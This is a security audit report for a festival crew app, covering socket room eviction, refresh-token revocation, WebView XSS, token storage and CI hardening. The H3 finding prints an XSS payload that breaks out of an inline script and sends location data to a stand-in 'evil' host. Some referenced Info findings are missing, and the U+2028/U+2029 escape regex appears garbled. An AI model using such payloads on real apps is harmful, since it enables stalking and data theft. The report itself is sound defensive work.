# Festie Security Review — 2026-06-06

## Executive Summary

This review consolidates adversarially-verified findings across six dimensions: backend auth/sessions/CSRF/secrets, backend authz/input-validation/SQLi/new SOS+admin routes, Socket.IO realtime security (live-location/SOS), web security (XSS/CSP/token storage), mobile security (Expo/RN), and CI/secrets/supply-chain.

### Counts by severity

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 4 |
| Medium | 3 |
| Low | 9 |
| Info / Positive | 8 |

(Counts exclude the 6 "positive controls" Info entries, which are summarized separately; the Low/Info bucket above counts only defect-style findings.)

### Top themes

1. **Membership-change does not propagate to live socket/stream state.** The single highest-impact theme. A crew member who leaves or is kicked is never evicted from the crew Socket.IO room and keeps both receiving and injecting live GPS/SOS. Three findings (one High, two Medium) share this root cause and should be fixed together.
2. **Credential changes do not revoke long-lived refresh tokens.** Password change/reset (and admin reset/delete) clear sessions but never call `revokeAll`, leaving a 90-day account-takeover persistence window.
3. **User-controlled text reaches a JS/HTML context unescaped.** A mobile stored-XSS via meeting-point labels interpolated into an inline `<script>` in the map WebView is the worst instance; the web side adds a fragile hand-rolled escaper and a replayable token in `localStorage`.
4. **Cluster-correctness of rate limiters.** Several limiters are in-memory per-process and drift under PM2 cluster x4; most are backstopped by Redis-backed authoritative limiters, but the live-location flood cap and the SOS raise throttle are not.
5. **CI/supply-chain hardening gaps.** Workflow command injection via `workflow_dispatch` inputs, no `permissions:` least-privilege blocks, and a few unpinned `@latest` tool fetches — all gated behind repo write access.

### Overall posture

**Good baseline, with a small cluster of must-fix correctness gaps on the newest features (live location + SOS).** Core controls are strong: scrypt hashing, opaque server-side sessions with hashed tokens and absolute TTL, DB-backed login lockout, timing-equalized login, parameterized SQL, httpOnly+secure+sameSite cookies, a strict CSP (script-src 'self' + hashes, no unsafe-inline), no-referrer, SHA-pinned GitHub Actions, gitleaks gate, and confined secrets. The material risk is concentrated in (a) the realtime membership-revocation boundary, (b) refresh-token revocation on credential change, and (c) the mobile map WebView script-context injection. Fixing those three closes the bulk of real exposure.

## Critical / High (must-fix)

### H1. Kicked/removed crew member is never evicted from the crew Socket.IO room
- **Severity:** High · **Area:** realtime
- **Location:** `routes/crew-members.ts:79-89` (leave) and `:120-131` (kick) — `removeMember` + broadcast with no room eviction; join at `routes/socket.ts:333`; disconnect-only cleanup at `routes/socket.ts:573`.
- **Vulnerability:** Self-leave (`DELETE /:crewId/leave`) and kick (`DELETE /:crewId/members/:userId`) delete the membership row and emit `crew:member-left` / `crew:member-kicked`, but never remove the affected user's socket from the `crew:${crewId}` room. Repo-wide grep confirms `socketsLeave`/`disconnectSockets`/`fetchSockets` are used nowhere; the only crew-room operation is `socket.join` at `socket.ts:333`, and Socket.IO removes a socket from a room only on disconnect (`socket.ts:573`), never on an application-level authz change. Crew removal also does not invalidate the user session, so the ex-member's socket stays connected and joined.
- **Exploit:** 1) Authenticated user legitimately joins crew C via `join:crew`. 2) They are kicked or self-leave but keep the tab/socket open (trivial: a backgrounded tab). 3) Their socket remains in room `crew:C`; every subsequent `location:peer-update` (`socket.ts:412,460`) and `sos:raised`/`sos:cleared` (`crew-sos.ts:124,170`) — including the coarse SOS coordinate — is delivered to them, passively, with no re-join. This is a cross-tenant privacy breach of the app's most sensitive data.
- **Fix:** On every membership removal (self-leave and kick), force the affected socket(s) out of the room server-side. After `stores.crews.removeMember` in `routes/crew-members.ts`:
  ```js
  for (const s of await io.in('crew:'+crewId).fetchSockets()) {
    if (s.data.userId === removedUserId) {
      s.leave('crew:'+crewId);
      delete s.data.crewId;
      delete s.data.sharingCrewId;
    }
  }
  ```
  (or maintain a `userId -> socketIds` index and use `socketsLeave`). Also emit `crew:access-revoked` / `location:peer-stopped` to the evicted client so it tears down map and SOS state. Note: no `disconnectUserSockets` helper exists in this codebase — implement the room cleanup directly.

### H2. Password change and password reset do not revoke refresh tokens
- **Severity:** High · **Area:** backend
- **Location:** `routes/auth.ts:570-579` (change-password); `routes/email-auth.ts:365-369` (reset-password); `lib/db/stores/sessions.ts:144-156` (`refreshTokens.validate`); also `routes/admin-users.ts:271` (admin reset) and `:326` (admin delete).
- **Vulnerability:** change-password (`auth.ts:574`) and reset-password (`email-auth.ts:367`) call `invalidateUserSessions` + disconnect sockets but never call `stores.refreshTokens.revokeAll(userId)`. `refreshTokens.validate` (`sessions.ts:144-156`) checks only `revoked` and `expires_at` — it ignores the stored `session_token` link column and any password epoch. `refreshTokens.rotate` (`sessions.ts:157-171`) revokes the old token and issues a fresh one, so a held token chain stays alive indefinitely. `account.ts:378` *does* call `revokeAll` on self-delete, proving the omission is an oversight. Admin reset-password (`admin-users.ts:271`) and admin delete-user (`:326`) also omit it, broadening the gap.
- **Exploit:** An attacker holding a victim's mobile refresh token (stolen/lost device, prior session, leaked token; issued at login with a 90-day TTL, `auth.ts:72-84`) keeps access after the victim changes/resets the password: POST the old refresh token to `/api/v1/auth/refresh-token` (`auth.ts:405`) to mint a brand-new session cookie/token plus a freshly rotated refresh token, re-establishing access on every rotation. The primary post-compromise remediation silently fails for up to 90 days.
- **Fix:** Call `stores.refreshTokens.revokeAll(userId)` in the change-password handler (`auth.ts` near 574) and the reset-password handler (`email-auth.ts` near 367); add it to admin reset-password (`admin-users.ts:271`) for consistency. Better: have `refreshTokens.validate()` also verify the linked `session_token` still exists (or bind tokens to a credential/password epoch) so a stale token cannot mint new sessions after a credential change.

### H3. Stored XSS in OfflineMap WebView via `</script>` breakout from unescaped meeting-point labels
- **Severity:** High · **Area:** mobile
- **Location:** `packages/mobile/components/OfflineMap.tsx:89,134` (`buildHtml`: `var PINS = ${pinsJson}`); source label/location: `lib/schemas.ts:347-357`, `lib/db/stores/crews.ts:511-512`, `packages/shared/src/utils/mapPins.ts:62-63`.
- **Vulnerability:** `buildHtml()` interpolates `JSON.stringify(pins)` directly into an inline `<script>` block. Pin label/sublabel derive from meeting-point label/location, which are user free-text validated only for length (`meetingPointCreateSchema`, `lib/schemas.ts:347-357` — no character/HTML restriction) and inserted raw into `crew_meeting_points` with no `sanitizeString` call (`lib/db/stores/crews.ts:511-512`). `JSON.stringify` does not escape `<` or `/` (empirically confirmed), so a label like `x</script><script>...</script>` closes the inline script element and injects executable HTML/JS into the WebView document. The component's `escapeHtml()` only guards the DOM popup render path, not this script-context interpolation.
- **Exploit:** An authenticated crew member sets a meeting-point label/location containing `</script><script>fetch('https://evil/x?d='+encodeURIComponent(JSON.stringify(window.LIVE_MARKERS||[])))</script>` plus valid coords. Any crew member opening the crew map with signal executes it; as peers share location and SOS coords are pushed into the same document via `injectJavaScript` (`window.__festieSetPeers`, `OfflineMap.tsx:241-246,375`), injected script reads `LIVE_MARKERS` / hooks the peer setter and exfiltrates real-time locations and SOS coordinates to an attacker host (`originWhitelist=['*']` + outbound network). The malicious pin persists server-side and self-propagates across the crew. Secondary weaker vector: a victim scanning an attacker plan-QR (`PlanQRScan.tsx:97-104`) whose codec is size-bounded but does not strip HTML. Authenticated low-trust precondition keeps this at High rather than Critical.
- **Fix:** Do not interpolate user data into an inline `<script>`. Bootstrap `buildHtml` with an empty PINS array and push pin/peer/SOS data in only via `injectJavaScript`/`postMessage` using a context-aware serializer that escapes for both JS-string and HTML contexts: `JSON.stringify(...).replace(/</g,'\\u003c').replace(/ /g,'\\u2028').replace(/ /g,'\\u2029')`. Add an in-document CSP `<meta http-equiv="Content-Security-Policy">` restricting `script-src`/`connect-src` to `data:` + unpkg.com + `*.tile.openstreetmap.org`, and narrow `originWhitelist` off `['*']` (matching the Spotify embed WebView at `app/set/[setId].tsx:456-477`). Defense in depth: apply `sanitizeString`/strip angle brackets to meeting-point label+location server-side.

### H4. Web persists a replayable session token in localStorage and on a window global
- **Severity:** High · **Area:** web
- **Location:** `packages/shared/src/services/api.ts:36,57-66` (cookie-mode default + `setAuthToken` -> `window.__FP_BEARER_TOKEN`); `packages/shared/src/stores/authStore.ts:50,94-138,154-161,176-181` (SECURE_FIELDS persist via `getSecureStorage`); `packages/shared/src/platform/storage.ts:26-30,70-72` (web `getSecureStorage` falls back to localStorage); `lib/app-context/cookies.ts:49-71` (`resolveRequestToken` accepts Bearer/x-user-token); `routes/auth.ts:234-238,309-316` (login/register return token+refreshToken in body).
- **Vulnerability:** The web client runs in the default `cookie` auth mode and never calls `setAuthMode('bearer')` nor `configureSecureStorage()`, so `getSecureStorage()` returns the regular localStorage adapter (`storage.ts:70-72,26-30`). On every login/register the server returns `token` in the body (`auth.ts:316,234`), `authStore` stores it as `userToken` (`authStore.ts:160,181`), and the split PersistStorage writes it to `festie-secure-userToken` in localStorage (`authStore.ts:118-130`). `setAuthToken()` additionally writes the raw token to `window.__FP_BEARER_TOKEN` (`api.ts:59-65`). That token is a fully valid session credential the backend accepts via `Authorization: Bearer` or `x-user-token` (`cookies.ts:50-61`), independent of the httpOnly cookie. The window global is never even used for web requests (Authorization is attached only when `_authMode === 'bearer'`, `api.ts:288`) — pure attack surface.
- **Exploit:** Requires a script-execution foothold (XSS) or supply-chain/CDN compromise; the strong CSP makes injected-script XSS hard. But the design converts any future script-exec bug from a transient cookie-bound hijack into theft of a portable, replayable session token (read `localStorage['festie-secure-userToken']` or `window.__FP_BEARER_TOKEN`, replay via `x-user-token` from anywhere). Also recoverable from disk on a shared/stolen device. This defeats the primary purpose of the httpOnly cookie.
- **Fix:** On web, do not persist a client-side session credential. Either (a) have the backend omit `token`/`refreshToken` from login/register bodies for cookie-mode clients (negotiate by Origin/Accept or an explicit mode flag) and rely solely on the httpOnly cookie + `/auth/me`, or (b) exclude `userToken`/`adminToken` from the persist `partialize` on web (memory only) and re-establish from the cookie on reload. Additionally, stop writing `window.__FP_BEARER_TOKEN` on web — guard it behind `_authMode === 'bearer'` (native only).

## Medium

### M1. Admin "bulk deactivate" only clears sessions — does not disable the account
- **Severity:** Medium · **Area:** backend
- **Location:** `routes/admin-bulk.ts:21-48` (POST `/admin/bulk/deactivate`); login gate absent at `routes/auth.ts:272-321` + `users.ts:151`.
- **Vulnerability:** The route is audited as `bulk_deactivate` and returns `status:'deactivated'`, but its only effect is `stores.sessions.deleteUserSessions(userId)` (`admin-bulk.ts:28`) — a force-logout. It never sets `users.deleted_at`, flips an active flag (no such column exists), or blocks re-auth. The login path has no active/disabled gate (`auth.ts:272-321`; `getByUsername` filters only `deleted_at IS NULL` at `users.ts:151`), and a soft-deleted account is auto-reactivated on successful login (`auth.ts:303-307`).
- **Exploit:** No attacker action needed — the control silently fails. An admin uses bulk-deactivate as an incident/abuse response during a festival; the targeted user simply logs back in seconds later with unchanged credentials. Contrast `DELETE /admin/users/:id` (`admin-users.ts:287`), which performs a real soft-delete. Admins receive false assurance from the action name, response payload, and audit-log entry.
- **Fix:** Make it a real deactivation: add an `is_active=false`/`deactivated_at` column that the login lookup and `validateUserSession` reject (in addition to clearing sessions), and ensure it is not auto-cleared on login the way `deleted_at` is. If only a logout is intended, rename the route/response status/audit action to `force_logout` so semantics match behavior.

### M2. `location:update` streaming path never re-validates membership — ex-member keeps injecting GPS
- **Severity:** Medium · **Area:** realtime
- **Location:** `routes/socket.ts:434-476` (handler; self-documented no-revalidation at `:435-436`), authorizing on `socket.data.sharingCrewId` stamped at `:405`.
- **Vulnerability:** `location:update` is the high-frequency path and by design performs no session or membership re-check (comment at `:435-436`). It authorizes solely on `socket.data.sharingCrewId`/`userId` stamped once at `location:share` (`:405`). Membership is verified only at share time (`:398-399`) and join time (`:324`) — never while streaming. A user removed from the crew after `location:share` keeps broadcasting their position into `crew:${crewId}` on every tick. Stop conditions are only `location:stop`, disconnect, or `LIVE_LOCATION_ENABLED=false`. This is the injection half of the same root cause as H1 (which covers the receive half); lowered to Medium because it additionally requires the ex-member's client to keep emitting and is fully closed by the eviction fix.
- **Exploit:** A member starts sharing successfully, then leaves / is removed, and their client (modified or simply not torn down) keeps emitting `location:update`. The server relays it to current members indefinitely.
- **Fix:** Primary mitigation is the H1 room-eviction fix. As defense-in-depth so the stream self-heals: cache `stores.crews.getMember` with a short TTL (every N seconds or M updates per socket) and drop + emit `NOT_A_MEMBER` on failure; at minimum, clear `socket.data.sharingCrewId` for the removed user's socket during member removal.

### M3. `location:update` flood limiter is per-process in-memory — multi-socket fan-out bypasses the 12/min/user cap
- **Severity:** Medium · **Area:** realtime
- **Location:** `routes/socket.ts:453` (`LOCATION_UPDATE_LIMIT.consume(userId)`); `lib/rate-limiting.ts:550` (`_createSocketEventLimiter`, in-memory) with cluster-drift note at `:555-557`.
- **Vulnerability:** `LOCATION_UPDATE_LIMIT` is an in-memory per-process limiter; `rate-limiting.ts:555-557` explicitly acknowledges per-process drift under PM2 cluster (Festie runs cluster x4). The cap is keyed by `userId` but counters are not shared across workers, so one user opening N concurrent sockets that land on different workers can stream up to ~N×12 updates/min into the crew room. Each socket needs only one `location:share` to stamp `sharingCrewId`; `location:update` thereafter has no ack and no per-message auth.
- **Exploit:** A single authenticated crew member opens K Socket.IO connections (new `io()` per tab), runs `join:crew` + `location:share` on each, then streams `location:update` on all. Effective broadcast rate scales with K; each `location:peer-update` is JSON-serialized and fanned out to every member's device — a realtime DoS / battery-and-bandwidth amplification, more impactful on constrained festival networks. Bounded to crews the attacker is a member of.
- **Fix:** Back the location-update limiter with Redis (same store as the production `rateLimit()` middleware) keyed by `userId` so the cap is cluster-wide; cap concurrent sharing sockets per user (e.g. one active `sharingCrewId` socket per user) and/or a per-user connection cap; consider server-side coalescing of outbound peer-update emits per room.

## Low / Info

### Low

- **L1. SOS message bypasses `sanitizeString` before durable storage and crew fan-out** (backend) — `routes/crew-sos.ts:85,98,117`; schema `schemas.ts:717`. SOS message is only Zod `.trim().max(280)` + in-handler trim/slice before going into `crew_activity.detail`, the `sos:raised` socket payload, and the push body — never through `sanitizeString()`, unlike every other crew free-text field (`crews.ts:193/505`, `account.ts:253`, `lineup-import.ts:207-215`). React/RN auto-escape and there is no `dangerouslySetInnerHTML`, so not stored XSS; impact is RTL-override/zero-width/control-char text spoofing on a safety-critical surface. Fix: run the message through `sanitizeString(body.message, 280)` before building detail, socket payload, and push.
- **L2. `location:update` keeps relaying live GPS after a sharer is kicked or leaves** (realtime) — `routes/socket.ts:434-476`; kick `crew-members.ts:99-136`; leave `socket.ts:344-368`. The leave handler clears `socket.data.crewId` but not `socket.data.sharingCrewId`, and kick does no server-side socket cleanup. (Same root cause as H1/M2; tracked here as the per-handler cleanup gap.) Fix: on kick and leave, force the user's sockets out of `crew:${crewId}` and clear `sharingCrewId` server-side; do not trust the client. The originally suggested `disconnectUserSockets` helper does not exist — implement room cleanup directly.
- **L3. SOS clear has no active-SOS check — DND-bypassing push/alert spam scoped to a crew** (backend) — `routes/crew-sos.ts:145-187`; raise throttle `rate-limiting.ts:552-558`; critical push `crew-sos.ts:194-214`. `/sos/clear` requires only membership and unconditionally writes a `sos_cleared` row + crew-wide `sos:cleared` broadcast with no active-SOS guard; the raise throttle is 1/120s in-memory but drifts to ~4/120s under PM2 x4. A member can toggle raise/clear to generate DND-bypassing critical pushes (`crew_sos` is in the critical path) and alert fatigue scoped to one crew. Fix: track active-SOS state and make clear a no-op/409 when nothing is active; consider a Redis-keyed incident-scoped raise throttle.
- **L4. `location:peer-update` relays client-supplied `capturedAt` and coordinates with no temporal/continuity bounds** (realtime) — `routes/socket.ts:460-472,411-423`; `lib/schemas.ts:680-691,660-667`. `capturedAt` is only `z.string().datetime()` with no bound relative to server time, so a client can appear perpetually "live · N ago"; lat/lng are only range-checked, so a sharer can teleport their own marker. Identity is not spoofable (userId/username come from server-held `socket.data`, `:463-464`). Self-spoof / UX integrity only. Fix: clamp `capturedAt` to a small window around server time and prefer server `serverAt` for staleness rendering.
- **L5. CrewMap builds popup HTML via `setHTML` with a custom escaper missing single-quote** (web) — `packages/web/src/components/crew/CrewMap.tsx:81-83,203-208,245-251,279-283`. `escapeHtml()` escapes `& < > "` but not `'`. Every value flowing in today is safe in context (numeric coords, server-trusted usernames, Zod-validated text in element-text contexts), so no live exploit — latent DOM-XSS fragility if the popup HTML is extended. Fix: build popups with DOM APIs (`createElement` + `textContent` + `setAttribute`) mirroring the already-safe peer marker; if string HTML stays, complete the escaper and assert `https` href scheme.
- **L6. Mobile: live peer/SOS strings injected into WebView JS context without context-aware escaping (U+2028/U+2029)** (mobile, confidence low) — `packages/mobile/components/OfflineMap.tsx:375`. Peer username/SOS message JSON enters executable JS via `injectJavaScript`; `JSON.stringify` does not escape U+2028/U+2029, and `sanitizeString` is not applied on this relay path. Modern Hermes/JSC handle these inside a JS string literal, so practical impact is effectively nil — defense-in-depth that compounds H3. Fix: route through the same hardened context-aware serializer used to fix H3.
- **L7. Dedicated auth IP rate limiter (with lockout) mounted only on `/login` and `/register`** (backend) — `lib/middleware.ts:336-338`; `routes/auth.ts:405-407`; `routes/email-auth.ts:336-340`. The strict Redis-backed `authRateLimit` (~10/5min, cluster-accurate, paired with DB-backed per-account lockout) covers only `/login` and `/register`; `/refresh-token` and `/reset-password` rely on weaker IP-keyed limiters. Not exploitable as a credential attack (256-bit opaque tokens), and `/refresh-token` is double-IP-rate-limited — consistency/defense-in-depth only. Fix: extend `authRateLimit` across the full `/api/v1/auth` credential surface and add a token/account-scoped lockout on `/refresh-token`.
- **L8. Origin/CSRF enforcement skipped for any request bearing an Authorization Bearer header** (backend, confidence medium) — `lib/app-context/request-helpers.ts:104-117`; `lib/app-context/cookies.ts:49-64`. `enforceAllowedOrigin` returns `next()` immediately when `hasBearerToken(req)`, and `resolveRequestToken` accepts the same session-token value as cookie or Bearer, making the Bearer branch a blanket Origin exemption. Not classic-CSRF exploitable (browsers cannot set Authorization cross-site without a blocked preflight, and the attacker needs the secret token) — design fragility. Fix: restrict the Bearer exemption to Bearer-only clients (mobile) and keep enforcing Origin for cookie-authenticated requests; ideally issue distinct token classes for cookie vs mobile.
- **L9. CI: workflow command injection, missing `permissions:`, and unpinned tool fetches** (ci-secrets) — three Low items, all gated behind repo write access:
  - **Command injection via `workflow_dispatch` inputs** — `.github/workflows/mobile-ota.yml:64-67`. `${{ inputs.branch }}` / `${{ inputs.message }}` are inlined into a `run:` shell, expanded before the shell parses, so shell metacharacters execute on the runner and can exfiltrate the in-scope `EXPO_TOKEN` (`:59`). Requires repo WRITE to fire (insider/privilege-escalation). Fix: pass inputs via `env:` and reference `"$BRANCH"`/`"$MSG"`.
  - **No `permissions:` block on any workflow** — `ci.yml`, `mobile-ota.yml`, `mobile-release-gate.yml`, `android-e2e.yml`. `GITHUB_TOKEN` inherits the repo default; if that is read/write, any in-job code-exec escalates to repo write/release tampering. Fix: set `permissions: contents: read` per workflow and elevate per-job only where needed; set the repo default token to read-only.
  - **Unpinned tool fetches** — `mobile-release-gate.yml:45` (`npx expo-doctor@latest`), `android-e2e.yml:84-88` (`curl … | bash` Maestro install), `mobile-ota.yml:58` (`eas-version: latest`). TOCTOU supply-chain sinks; the `eas-version: latest` one is sensitive because it holds `EXPO_TOKEN`. Fix: pin `eas-version` and `expo-doctor` to exact versions; checksum-verify the Maestro installer.

Optional cleanup only.
- **I6. Committed `google-services.json` is public Firebase client config, correctly allowlisted** (ci-secrets) — `packages/mobile/google-services.json`; `.gitleaks.toml:7-11`. Contains only client-side identifiers (no service-account/FCM-server key; `oauth_client` empty). Ships in every APK; commit leaks nothing extra. No code change — verify in Google Cloud console that the embedded Android API key has app + API restrictions.

## Positive controls observed (what's done right)

- **Auth/session core (backend):** scrypt hashing (`lib/crypto-auth.ts:20-42`); opaque server-side sessions storing only SHA-256 token hashes with absolute TTL eviction and `FOR UPDATE`-locked max-concurrent enforcement (`sessions.ts:18-34,57-61`); DB-backed login-failure lockout (`sessions.ts:180-207`); timing-equalized login (`auth.ts:282-299`); reset/verify tokens are 256-bit, hashed at rest, single-use via atomic consume, time-limited (`email-tokens.ts:78-84`); parameterized SQL throughout.
- **Realtime:** SOS raise/clear are HTTP POSTs with `userAuth` + `getMember` authz + Zod + coarse-rounded (~11m) coordinates + dual rate limits; clients cannot emit `sos:raised`/`sos:cleared` (server-only); `join:crew` and `location:share` re-check session + membership and disconnect on invalid session; disconnect emits `location:peer-stopped` so markers don't ghost; outbound location identity derives from server-held `socket.data`, preventing impersonation; live GPS is socket-only with no Postgres writes.
- **Web:** session cookie is httpOnly + secure + sameSite (`cookies.ts:27-44`); Helmet sets `Referrer-Policy: no-referrer`, frame-ancestors deny, HSTS, COOP/CORP same-origin; CSP uses `script-src 'self'` + inline hashes with no `unsafe-inline`; `logout()` purges the SW api-cache to prevent shared-device cross-account leakage; web bundle carries only public `VITE_` config; no `dangerouslySetInnerHTML`/`eval`/`document.write`.
- **Mobile:** the Spotify embed WebView (`app/set/[setId].tsx:456-477`) is correctly hardened with a narrow `originWhitelist` + default-deny navigation handler — the model the OfflineMap WebView should follow.
- **CI / supply-chain:** every `uses:` across all four workflows is SHA-pinned (40-char + `# vX`); Dependabot (github-actions-only) + Renovate (npm/docker, `vulnerabilityAlerts prPriority 10`, `minimumReleaseAge`) with non-overlapping scopes; gitleaks runs on every push/PR with `fetch-depth:0`; `EXPO_TOKEN` confined to the single `workflow_dispatch`-only `mobile-ota` job; no `pull_request_target`/`workflow_run` triggers anywhere (no fork-secret-exposure path); `.mcp.json` references only the public Expo HTTP MCP with no token.

## Recommendations (ranked)

1. **Fix the realtime membership-revocation boundary (H1 + M2 + L2 together).** Evict the affected user's socket(s) from `crew:${crewId}` and clear `sharingCrewId`/`crewId` server-side on both kick and leave (using `io.in(room).fetchSockets()` filtered by `userId`), and emit `crew:access-revoked`/`location:peer-stopped`. Add a short-TTL membership re-check on the `location:update` stream as a self-healing backstop. This single fix closes the highest-impact privacy leak plus its injection counterpart.
2. **Revoke refresh tokens on every credential change (H2).** Add `stores.refreshTokens.revokeAll(userId)` to change-password, reset-password, admin reset-password, and admin delete-user; ideally make `refreshTokens.validate()` verify the linked `session_token` / a password epoch.
3. **Eliminate the mobile map WebView script-context injection (H3 + I4 + L6).** Stop interpolating user data into the inline `<script>`; bootstrap empty and push data via a context-aware serializer; add an in-document CSP and narrow `originWhitelist`; sanitize meeting-point label/location server-side.
4. **Stop persisting a replayable session token on web (H4).** Omit `token`/`refreshToken` from cookie-mode login/register bodies (or exclude them from the persist partialize, memory-only), and guard `window.__FP_BEARER_TOKEN` behind bearer mode.
5. **Make admin "deactivate" actually deactivate (M1).** Add an `is_active`/`deactivated_at` column enforced at login and session validation (not auto-cleared on login), or rename the route/audit action to `force_logout`.
6. **Move safety-path rate limiters to Redis (M3 + L3).** Back `LOCATION_UPDATE_LIMIT` and the SOS raise throttle with cluster-wide Redis limiters; cap concurrent sharing sockets per user; add an active-SOS guard to `/sos/clear`.
7. **Close defense-in-depth gaps:** run SOS message through `sanitizeString` (L1); clamp `capturedAt` to a server-time window (L4); replace the CrewMap `setHTML` path with DOM APIs / complete the escaper (L5); extend `authRateLimit` across the full auth surface and restrict the Bearer/Origin exemption (L7, L8).
8. **Harden CI (L9):** pass `workflow_dispatch` inputs via `env:`, add `permissions: contents: read` to every workflow (and set the repo default token read-only), and pin `eas-version`/`expo-doctor` + checksum-verify the Maestro installer.
9. **Housekeeping (Info):** let Renovate clear the five build-tooling advisories (I1); document the "untrusted at every output boundary" contract for stored strings (I2); optionally scrub the reset token from the URL (I3); remove the redundant in-memory email limiters (I5); verify Google Cloud restrictions on the embedded Android API key (I6).
